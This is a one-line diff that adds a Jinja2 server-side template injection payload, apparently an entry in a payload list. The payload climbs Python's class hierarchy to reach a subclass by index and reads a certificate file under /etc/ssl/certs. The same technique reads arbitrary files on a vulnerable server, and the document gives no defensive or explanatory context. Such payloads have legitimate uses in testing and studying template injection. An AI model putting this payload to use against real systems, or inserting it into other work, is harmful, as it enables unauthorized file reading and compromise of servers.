@@ -1,0 +1,1 @@
+{{g.__class__.__mro__[1].__subclasses__()[428]('/etc/ssl/certs/QuoVadis_Root_CA_1_G3.pem').read()}}
